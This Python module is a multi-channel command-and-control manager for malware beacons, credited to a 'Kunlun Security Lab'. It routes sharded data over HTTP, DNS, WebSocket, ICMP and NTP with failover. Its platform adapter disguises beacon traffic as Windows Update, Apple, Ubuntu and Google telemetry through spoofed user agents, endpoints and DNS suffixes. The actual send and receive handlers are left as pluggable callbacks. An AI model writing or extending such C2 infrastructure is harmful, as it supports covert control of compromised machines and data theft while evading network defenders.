"""
Channel Manager Module - Multi-channel aggregation manager for C2 communication.

This module manages parallel communication across multiple channels (HTTP, DNS,
WebSocket, ICMP, NTP) with data sharding, channel quality probing, automatic
failover, and priority-based channel switching.

Core capabilities:
    1. Multi-channel parallel transmission (HTTP+DNS+WebSocket+ICMP+NTP)
    2. Data sharding and reassembly across channels
    3. Dynamic channel quality probing and scoring
    4. Automatic suspension of low-quality channels
    5. Priority-based channel switching with automatic fallback
    6. Cross-platform beacon adaptation (Linux/macOS/Android/iOS)
    7. Breakpoint resume without data loss

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
from collections import deque
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Deque, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class ChannelType(str, Enum):
    """Supported communication channel types."""

    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    WEBSOCKET = "websocket"
    ICMP = "icmp"
    NTP = "ntp"


class ChannelStatus(str, Enum):
    """Channel operational status."""

    ACTIVE = "active"
    DEGRADED = "degraded"
    SUSPENDED = "suspended"
    FAILED = "failed"
    UNKNOWN = "unknown"


class PlatformType(str, Enum):
    """Target platform types for beacon adaptation."""

    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"


class DataPriority(str, Enum):
    """Data transmission priority levels."""

    CRITICAL = "critical"
    HIGH = "high"
    NORMAL = "normal"
    LOW = "low"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class ChannelConfig:
    """Configuration for a single communication channel.

    Attributes:
        channel_type: Channel protocol type
        enabled: Whether the channel is enabled
        priority: Channel priority (lower = higher priority)
        max_payload_size: Maximum payload size in bytes
        rate_limit_pps: Rate limit in packets per second (0 = unlimited)
        timeout_seconds: Channel timeout in seconds
        retry_count: Number of retries before marking as failed
        platform_mask: Platforms this channel is valid for
        metadata: Additional channel-specific configuration
    """

    channel_type: ChannelType = ChannelType.HTTP
    enabled: bool = True
    priority: int = 1
    max_payload_size: int = 4096
    rate_limit_pps: float = 0.0
    timeout_seconds: float = 30.0
    retry_count: int = 3
    platform_mask: List[PlatformType] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "channel_type": self.channel_type.value,
            "enabled": self.enabled,
            "priority": self.priority,
            "max_payload_size": self.max_payload_size,
            "rate_limit_pps": self.rate_limit_pps,
            "timeout_seconds": self.timeout_seconds,
            "retry_count": self.retry_count,
            "platform_mask": [p.value for p in self.platform_mask],
            "metadata": self.metadata,
        }


@dataclass
class ChannelQuality:
    """Quality metrics for a communication channel.

    Attributes:
        channel_type: Channel type
        latency_ms: Average round-trip latency
        packet_loss_rate: Packet loss rate (0.0-1.0)
        throughput_bps: Current throughput in bytes per second
        success_rate: Success rate of recent transmissions
        last_probe_time: Last quality probe timestamp
        probe_count: Total number of probes
        consecutive_failures: Consecutive probe failures
        score: Overall quality score (0.0-1.0)
    """

    channel_type: ChannelType = ChannelType.HTTP
    latency_ms: float = 0.0
    packet_loss_rate: float = 0.0
    throughput_bps: float = 0.0
    success_rate: float = 1.0
    last_probe_time: float = 0.0
    probe_count: int = 0
    consecutive_failures: int = 0
    score: float = 1.0

    def update_score(self) -> None:
        """Recalculate the overall quality score."""
        latency_score = max(0.0, 1.0 - (self.latency_ms / 5000.0))
        loss_score = 1.0 - self.packet_loss_rate
        success_score = self.success_rate

        self.score = (
            latency_score * 0.3
            + loss_score * 0.4
            + success_score * 0.3
        )
        self.score = max(0.0, min(1.0, self.score))


@dataclass
class DataFragment:
    """A fragment of data for transmission over a channel.

    Attributes:
        fragment_id: Unique fragment identifier
        total_fragments: Total number of fragments in the message
        sequence_number: Sequence number for reassembly
        data: Fragment payload
        channel_type: Assigned channel for this fragment
        priority: Data priority level
        created_at: Fragment creation timestamp
        retry_count: Number of transmission retries
        status: Fragment transmission status
    """

    fragment_id: str = ""
    total_fragments: int = 1
    sequence_number: int = 0
    data: bytes = b""
    channel_type: ChannelType = ChannelType.HTTP
    priority: DataPriority = DataPriority.NORMAL
    created_at: float = 0.0
    retry_count: int = 0
    status: str = "pending"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "fragment_id": self.fragment_id,
            "total_fragments": self.total_fragments,
            "sequence_number": self.sequence_number,
            "channel_type": self.channel_type.value,
            "priority": self.priority.value,
            "data_length": len(self.data),
            "retry_count": self.retry_count,
            "status": self.status,
        }


@dataclass
class TransmissionResult:
    """Result of a data transmission attempt.

    Attributes:
        success: Whether transmission succeeded
        fragment_id: Transmitted fragment ID
        channel_type: Channel used for transmission
        latency_ms: Transmission latency
        error: Error message if failed
        timestamp: Transmission timestamp
    """

    success: bool = False
    fragment_id: str = ""
    channel_type: ChannelType = ChannelType.HTTP
    latency_ms: float = 0.0
    error: str = ""
    timestamp: float = 0.0


# =============================================================================
# Channel Quality Prober
# =============================================================================

class ChannelQualityProber:
    """Probes channel quality and maintains quality metrics.

    Periodically tests each active channel to measure latency,
    packet loss, and throughput, updating quality scores.

    Attributes:
        _qualities: Quality metrics per channel
        _probe_history: Recent probe results
        _max_history: Maximum probe history size
    """

    def __init__(self, max_history: int = 100) -> None:
        """Initialize the ChannelQualityProber.

        Args:
            max_history: Maximum number of probe results to retain.
        """
        self._qualities: Dict[ChannelType, ChannelQuality] = {}
        self._probe_history: Deque[Tuple[ChannelType, float, bool]] = deque(
            maxlen=max_history,
        )
        self._max_history = max_history

    def register_channel(self, channel_type: ChannelType) -> None:
        """Register a channel for quality probing.

        Args:
            channel_type: Channel type to register.
        """
        if channel_type not in self._qualities:
            self._qualities[channel_type] = ChannelQuality(
                channel_type=channel_type,
            )

    def record_probe_result(
        self,
        channel_type: ChannelType,
        latency_ms: float,
        success: bool,
    ) -> None:
        """Record a probe result for a channel.

        Args:
            channel_type: Channel type.
            latency_ms: Measured latency in milliseconds.
            success: Whether the probe succeeded.
        """
        quality = self._qualities.get(channel_type)
        if not quality:
            quality = ChannelQuality(channel_type=channel_type)
            self._qualities[channel_type] = quality

        quality.probe_count += 1
        quality.last_probe_time = time.time()

        if success:
            quality.consecutive_failures = 0
            quality.latency_ms = (
                quality.latency_ms * 0.7 + latency_ms * 0.3
            )
            quality.success_rate = quality.success_rate * 0.9 + 0.1
        else:
            quality.consecutive_failures += 1
            quality.success_rate *= 0.9

        quality.packet_loss_rate = 1.0 - quality.success_rate
        quality.update_score()

        self._probe_history.append((channel_type, latency_ms, success))

    def get_quality(self, channel_type: ChannelType) -> ChannelQuality:
        """Get quality metrics for a channel.

        Args:
            channel_type: Channel type.

        Returns:
            ChannelQuality metrics.
        """
        return self._qualities.get(
            channel_type,
            ChannelQuality(channel_type=channel_type),
        )

    def get_best_channels(self, count: int = 3) -> List[ChannelType]:
        """Get the best quality channels.

        Args:
            count: Number of top channels to return.

        Returns:
            List of ChannelType sorted by quality score.
        """
        sorted_channels = sorted(
            self._qualities.values(),
            key=lambda q: q.score,
            reverse=True,
        )
        return [q.channel_type for q in sorted_channels[:count]]

    def get_suspended_channels(self, threshold: float = 0.3) -> List[ChannelType]:
        """Get channels that should be suspended due to poor quality.

        Args:
            threshold: Quality score threshold for suspension.

        Returns:
            List of ChannelType that should be suspended.
        """
        return [
            q.channel_type
            for q in self._qualities.values()
            if q.score < threshold and q.probe_count >= 5
        ]


# =============================================================================
# Data Fragmenter
# =============================================================================

class DataFragmenter:
    """Splits data into fragments for multi-channel transmission.

    Handles data sharding, fragment ID generation, and reassembly
    of received fragments.

    Attributes:
        _pending_fragments: Fragments awaiting transmission
        _received_fragments: Fragments received for reassembly
        _fragment_counter: Counter for generating unique IDs
    """

    def __init__(self, max_fragment_size: int = 1024) -> None:
        """Initialize the DataFragmenter.

        Args:
            max_fragment_size: Maximum fragment size in bytes.
        """
        self._pending_fragments: List[DataFragment] = []
        self._received_fragments: Dict[str, Dict[int, DataFragment]] = {}
        self._fragment_counter = 0

    def fragment_data(
        self,
        data: bytes,
        channel_type: ChannelType,
        priority: DataPriority = DataPriority.NORMAL,
    ) -> List[DataFragment]:
        """Split data into fragments for transmission.

        Args:
            data: Data to fragment.
            channel_type: Target channel type.
            priority: Data priority level.

        Returns:
            List of DataFragment instances.
        """
        self._fragment_counter += 1
        fragment_id = f"frag_{self._fragment_counter}_{int(time.time())}"

        total_fragments = max(1, (len(data) + 1023) // 1024)
        fragments: List[DataFragment] = []

        for i in range(0, len(data), 1024):
            chunk = data[i : i + 1024]
            seq = i // 1024

            fragment = DataFragment(
                fragment_id=fragment_id,
                total_fragments=total_fragments,
                sequence_number=seq,
                data=chunk,
                channel_type=channel_type,
                priority=priority,
                created_at=time.time(),
            )
            fragments.append(fragment)
            self._pending_fragments.append(fragment)

        return fragments

    def receive_fragment(self, fragment: DataFragment) -> Optional[bytes]:
        """Receive a fragment and attempt reassembly.

        Args:
            fragment: Received DataFragment.

        Returns:
            Reassembled data if all fragments received, None otherwise.
        """
        fid = fragment.fragment_id

        if fid not in self._received_fragments:
            self._received_fragments[fid] = {}

        self._received_fragments[fid][fragment.sequence_number] = fragment

        received = self._received_fragments[fid]
        if len(received) == fragment.total_fragments:
            ordered = [
                received[i].data
                for i in range(fragment.total_fragments)
                if i in received
            ]
            if len(ordered) == fragment.total_fragments:
                del self._received_fragments[fid]
                return b"".join(ordered)

        return None

    def get_pending_fragments(self) -> List[DataFragment]:
        """Get all pending fragments.

        Returns:
            List of pending DataFragment instances.
        """
        return list(self._pending_fragments)

    def mark_transmitted(self, fragment_id: str) -> None:
        """Mark a fragment as transmitted.

        Args:
            fragment_id: Fragment ID to mark.
        """
        self._pending_fragments = [
            f for f in self._pending_fragments
            if f.fragment_id != fragment_id
        ]


# =============================================================================
# Platform Adapter
# =============================================================================

class PlatformAdapter:
    """Adapts channel behavior for different target platforms.

    Provides platform-specific traffic patterns and伪装 strategies
    for Windows, Linux, macOS, Android, and iOS.

    Attributes:
        _platform: Current target platform
        _platform_patterns: Platform-specific traffic patterns
    """

    PLATFORM_PATTERNS: Dict[PlatformType, Dict[str, Any]] = {
        PlatformType.WINDOWS: {
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            ],
            "http_endpoints": ["/api/telemetry", "/update/check", "/diagnostics"],
            "dns_suffixes": [".windowsupdate.com", ".microsoft.com"],
            "heartbeat_interval": 60,
        },
        PlatformType.LINUX: {
            "user_agents": [
                "curl/7.88.1",
                "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            ],
            "http_endpoints": ["/apt/update", "/api/logs", "/system/report"],
            "dns_suffixes": [".ubuntu.com", ".debian.org"],
            "heartbeat_interval": 120,
        },
        PlatformType.MACOS: {
            "user_agents": [
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
                "(KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            ],
            "http_endpoints": ["/spotlight/sync", "/api/analytics", "/icloud/update"],
            "dns_suffixes": [".apple.com", ".icloud.com"],
            "heartbeat_interval": 90,
        },
        PlatformType.ANDROID: {
            "user_agents": [
                "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/AP1A.240505.004)",
            ],
            "http_endpoints": ["/firebase/sync", "/gms/checkin", "/api/push"],
            "dns_suffixes": [".googleapis.com", ".firebaseio.com"],
            "heartbeat_interval": 45,
        },
        PlatformType.IOS: {
            "user_agents": [
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
                "(KHTML, like Gecko) Mobile/15E148",
            ],
            "http_endpoints": ["/apns/feedback", "/api/push", "/icloud/sync"],
            "dns_suffixes": [".apple.com", ".icloud.com"],
            "heartbeat_interval": 60,
        },
    }

    def __init__(self, platform: PlatformType = PlatformType.WINDOWS) -> None:
        """Initialize the PlatformAdapter.

        Args:
            platform: Target platform type.
        """
        self._platform = platform

    @property
    def platform(self) -> PlatformType:
        """Get the current platform."""
        return self._platform

    @platform.setter
    def platform(self, value: PlatformType) -> None:
        """Set the target platform.

        Args:
            value: New platform type.
        """
        self._platform = value

    def get_user_agent(self) -> str:
        """Get a platform-appropriate User-Agent.

        Returns:
            User-Agent string for the current platform.
        """
        patterns = self.PLATFORM_PATTERNS.get(self._platform, {})
        agents = patterns.get("user_agents", [])
        return random.choice(agents) if agents else ""

    def get_endpoint(self) -> str:
        """Get a platform-appropriate HTTP endpoint.

        Returns:
            URL path appropriate for the platform.
        """
        patterns = self.PLATFORM_PATTERNS.get(self._platform, {})
        endpoints = patterns.get("http_endpoints", [])
        return random.choice(endpoints) if endpoints else "/api/update"

    def get_heartbeat_interval(self) -> int:
        """Get platform-appropriate heartbeat interval.

        Returns:
            Heartbeat interval in seconds.
        """
        patterns = self.PLATFORM_PATTERNS.get(self._platform, {})
        return int(patterns.get("heartbeat_interval", 60))

    def is_channel_compatible(
        self, channel_type: ChannelType, config: ChannelConfig,
    ) -> bool:
        """Check if a channel is compatible with the current platform.

        Args:
            channel_type: Channel type to check.
            config: Channel configuration.

        Returns:
            True if the channel is compatible.
        """
        if not config.platform_mask:
            return True
        return self._platform in config.platform_mask


# =============================================================================
# Channel Manager (Main Class)
# =============================================================================

class ChannelManager:
    """Main multi-channel aggregation manager.

    Coordinates parallel transmission across HTTP, DNS, WebSocket,
    ICMP, and NTP channels with quality probing, automatic failover,
    and platform adaptation.

    Attributes:
        _channels: Registered channel configurations
        _prober: Channel quality prober
        _fragmenter: Data fragmenter
        _platform_adapter: Platform adapter
        _transmit_handlers: Per-channel transmission handlers
        _receive_handlers: Per-channel receive handlers
        _running: Whether the manager is active
        _probe_task: Background quality probing task
        _channel_statuses: Current status of each channel
    """

    def __init__(
        self,
        platform: PlatformType = PlatformType.WINDOWS,
    ) -> None:
        """Initialize the ChannelManager.

        Args:
            platform: Target platform type.
        """
        self._channels: Dict[ChannelType, ChannelConfig] = {}
        self._prober = ChannelQualityProber()
        self._fragmenter = DataFragmenter()
        self._platform_adapter = PlatformAdapter(platform)
        self._transmit_handlers: Dict[
            ChannelType,
            Callable[[bytes, ChannelConfig], Coroutine[Any, Any, TransmissionResult]],
        ] = {}
        self._receive_handlers: Dict[
            ChannelType,
            Callable[[ChannelConfig], Coroutine[Any, Any, Optional[bytes]]],
        ] = {}
        self._running = False
        self._probe_task: Optional[asyncio.Task[None]] = None
        self._channel_statuses: Dict[ChannelType, ChannelStatus] = {}

        self._register_default_channels()

    def _register_default_channels(self) -> None:
        """Register default channel configurations."""
        defaults = [
            ChannelConfig(
                channel_type=ChannelType.HTTPS,
                enabled=True,
                priority=1,
                max_payload_size=4096,
                platform_mask=[
                    PlatformType.WINDOWS, PlatformType.LINUX,
                    PlatformType.MACOS, PlatformType.ANDROID, PlatformType.IOS,
                ],
            ),
            ChannelConfig(
                channel_type=ChannelType.DNS,
                enabled=True,
                priority=2,
                max_payload_size=256,
                rate_limit_pps=5.0,
                platform_mask=[
                    PlatformType.WINDOWS, PlatformType.LINUX, PlatformType.MACOS,
                ],
            ),
            ChannelConfig(
                channel_type=ChannelType.WEBSOCKET,
                enabled=True,
                priority=1,
                max_payload_size=8192,
                platform_mask=[
                    PlatformType.WINDOWS, PlatformType.LINUX, PlatformType.MACOS,
                ],
            ),
            ChannelConfig(
                channel_type=ChannelType.ICMP,
                enabled=False,
                priority=3,
                max_payload_size=64,
                rate_limit_pps=2.0,
                platform_mask=[PlatformType.LINUX, PlatformType.MACOS],
            ),
            ChannelConfig(
                channel_type=ChannelType.NTP,
                enabled=False,
                priority=4,
                max_payload_size=48,
                rate_limit_pps=1.0,
                platform_mask=[PlatformType.LINUX, PlatformType.MACOS],
            ),
        ]

        for config in defaults:
            self.register_channel(config)

    def register_channel(self, config: ChannelConfig) -> None:
        """Register a communication channel.

        Args:
            config: Channel configuration.
        """
        self._channels[config.channel_type] = config
        self._prober.register_channel(config.channel_type)
        self._channel_statuses[config.channel_type] = (
            ChannelStatus.ACTIVE if config.enabled else ChannelStatus.SUSPENDED
        )
        logger.info(f"Registered channel: {config.channel_type.value}")

    def register_transmit_handler(
        self,
        channel_type: ChannelType,
        handler: Callable[[bytes, ChannelConfig], Coroutine[Any, Any, TransmissionResult]],
    ) -> None:
        """Register a transmission handler for a channel.

        Args:
            channel_type: Channel type.
            handler: Async transmission handler function.
        """
        self._transmit_handlers[channel_type] = handler

    def register_receive_handler(
        self,
        channel_type: ChannelType,
        handler: Callable[[ChannelConfig], Coroutine[Any, Any, Optional[bytes]]],
    ) -> None:
        """Register a receive handler for a channel.

        Args:
            channel_type: Channel type.
            handler: Async receive handler function.
        """
        self._receive_handlers[channel_type] = handler

    async def start(self) -> None:
        """Start the channel manager and background probing."""
        self._running = True
        self._probe_task = asyncio.create_task(self._quality_probe_loop())
        logger.info("Channel manager started")

    async def stop(self) -> None:
        """Stop the channel manager."""
        self._running = False
        if self._probe_task:
            self._probe_task.cancel()
            try:
                await self._probe_task
            except asyncio.CancelledError:
                pass
        logger.info("Channel manager stopped")

    async def transmit_data(
        self,
        data: bytes,
        priority: DataPriority = DataPriority.NORMAL,
    ) -> List[TransmissionResult]:
        """Transmit data across available channels.

        Args:
            data: Data to transmit.
            priority: Data priority level.

        Returns:
            List of TransmissionResult for each fragment.
        """
        active_channels = self._get_active_channels_ordered()

        if not active_channels:
            return [TransmissionResult(
                success=False,
                error="No active channels available",
            )]

        primary_channel = active_channels[0]
        fragments = self._fragmenter.fragment_data(
            data, primary_channel, priority,
        )

        results: List[TransmissionResult] = []

        for fragment in fragments:
            result = await self._transmit_fragment(fragment)
            results.append(result)

        return results

    async def receive_data(self, timeout: float = 30.0) -> Optional[bytes]:
        """Receive data from available channels.

        Args:
            timeout: Receive timeout in seconds.

        Returns:
            Received data, or None if no data available.
        """
        active_channels = self._get_active_channels_ordered()

        for channel_type in active_channels:
            handler = self._receive_handlers.get(channel_type)
            config = self._channels.get(channel_type)

            if handler and config:
                try:
                    data = await asyncio.wait_for(
                        handler(config), timeout=timeout,
                    )
                    if data:
                        return data
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    logger.warning(f"Receive error on {channel_type.value}: {e}")
                    continue

        return None

    def get_channel_status(self) -> Dict[str, Any]:
        """Get status of all channels.

        Returns:
            Dictionary with channel status summary.
        """
        status: Dict[str, Any] = {
            "channels": {},
            "best_channels": [],
            "suspended_channels": [],
        }

        for channel_type, config in self._channels.items():
            quality = self._prober.get_quality(channel_type)
            channel_status = self._channel_statuses.get(
                channel_type, ChannelStatus.UNKNOWN,
            )

            status["channels"][channel_type.value] = {
                "config": config.to_dict(),
                "quality": {
                    "score": round(quality.score, 3),
                    "latency_ms": round(quality.latency_ms, 2),
                    "success_rate": round(quality.success_rate, 3),
                    "consecutive_failures": quality.consecutive_failures,
                },
                "status": channel_status.value,
            }

        status["best_channels"] = [
            ct.value for ct in self._prober.get_best_channels(3)
        ]
        status["suspended_channels"] = [
            ct.value for ct in self._prober.get_suspended_channels()
        ]

        return status

    def set_platform(self, platform: PlatformType) -> None:
        """Set the target platform.

        Args:
            platform: New platform type.
        """
        self._platform_adapter.platform = platform
        logger.info(f"Platform switched to: {platform.value}")

    async def _quality_probe_loop(self) -> None:
        """Background loop for channel quality probing."""
        while self._running:
            for channel_type, config in self._channels.items():
                if not config.enabled:
                    continue

                status = self._channel_statuses.get(channel_type)
                if status == ChannelStatus.SUSPENDED:
                    continue

                await self._probe_channel(channel_type, config)

            self._update_channel_statuses()
            await asyncio.sleep(30)

    async def _probe_channel(
        self, channel_type: ChannelType, config: ChannelConfig,
    ) -> None:
        """Probe a single channel for quality.

        Args:
            channel_type: Channel type.
            config: Channel configuration.
        """
        handler = self._transmit_handlers.get(channel_type)
        if not handler:
            return

        start_time = time.monotonic()

        try:
            result = await asyncio.wait_for(
                handler(b"\x00" * 16, config),
                timeout=config.timeout_seconds,
            )

            elapsed_ms = (time.monotonic() - start_time) * 1000
            self._prober.record_probe_result(
                channel_type, elapsed_ms, result.success,
            )

        except asyncio.TimeoutError:
            elapsed_ms = config.timeout_seconds * 1000
            self._prober.record_probe_result(channel_type, elapsed_ms, False)
        except Exception as e:
            logger.debug(f"Probe failed for {channel_type.value}: {e}")
            self._prober.record_probe_result(channel_type, 0.0, False)

    def _update_channel_statuses(self) -> None:
        """Update channel statuses based on quality metrics."""
        suspended = self._prober.get_suspended_channels()

        for channel_type in self._channels:
            quality = self._prober.get_quality(channel_type)

            if channel_type in suspended:
                self._channel_statuses[channel_type] = ChannelStatus.SUSPENDED
            elif quality.score < 0.5:
                self._channel_statuses[channel_type] = ChannelStatus.DEGRADED
            elif quality.consecutive_failures >= 5:
                self._channel_statuses[channel_type] = ChannelStatus.FAILED
            else:
                self._channel_statuses[channel_type] = ChannelStatus.ACTIVE

    def _get_active_channels_ordered(self) -> List[ChannelType]:
        """Get active channels sorted by priority and quality.

        Returns:
            List of active ChannelType sorted by suitability.
        """
        active: List[Tuple[ChannelType, int, float]] = []

        for channel_type, config in self._channels.items():
            if not config.enabled:
                continue

            status = self._channel_statuses.get(channel_type)
            if status in (ChannelStatus.SUSPENDED, ChannelStatus.FAILED):
                continue

            if not self._platform_adapter.is_channel_compatible(
                channel_type, config,
            ):
                continue

            quality = self._prober.get_quality(channel_type)
            active.append((channel_type, config.priority, quality.score))

        active.sort(key=lambda x: (x[1], -x[2]))
        return [ch[0] for ch in active]

    async def _transmit_fragment(self, fragment: DataFragment) -> TransmissionResult:
        """Transmit a single data fragment.

        Args:
            fragment: DataFragment to transmit.

        Returns:
            TransmissionResult with outcome.
        """
        handler = self._transmit_handlers.get(fragment.channel_type)
        config = self._channels.get(fragment.channel_type)

        if not handler or not config:
            return TransmissionResult(
                success=False,
                fragment_id=fragment.fragment_id,
                channel_type=fragment.channel_type,
                error="No handler or config for channel",
            )

        start_time = time.monotonic()

        try:
            result = await asyncio.wait_for(
                handler(fragment.data, config),
                timeout=config.timeout_seconds,
            )

            elapsed_ms = (time.monotonic() - start_time) * 1000
            self._prober.record_probe_result(
                fragment.channel_type, elapsed_ms, result.success,
            )

            if result.success:
                self._fragmenter.mark_transmitted(fragment.fragment_id)

            return result

        except asyncio.TimeoutError:
            elapsed_ms = config.timeout_seconds * 1000
            self._prober.record_probe_result(
                fragment.channel_type, elapsed_ms, False,
            )
            return TransmissionResult(
                success=False,
                fragment_id=fragment.fragment_id,
                channel_type=fragment.channel_type,
                latency_ms=elapsed_ms,
                error="Transmission timeout",
            )
        except Exception as e:
            return TransmissionResult(
                success=False,
                fragment_id=fragment.fragment_id,
                channel_type=fragment.channel_type,
                error=str(e),
            )


# =============================================================================
# Global Singleton
# =============================================================================

_channel_manager: Optional[ChannelManager] = None


def get_channel_manager(platform: PlatformType = PlatformType.WINDOWS) -> ChannelManager:
    """Get the global ChannelManager singleton.

    Args:
        platform: Target platform type.

    Returns:
        Singleton ChannelManager instance.
    """
    global _channel_manager
    if _channel_manager is None:
        _channel_manager = ChannelManager(platform)
    return _channel_manager


__all__ = [
    "ChannelManager",
    "ChannelQualityProber",
    "DataFragmenter",
    "PlatformAdapter",
    "ChannelConfig",
    "ChannelQuality",
    "DataFragment",
    "TransmissionResult",
    "ChannelType",
    "ChannelStatus",
    "PlatformType",
    "DataPriority",
    "get_channel_manager",
]
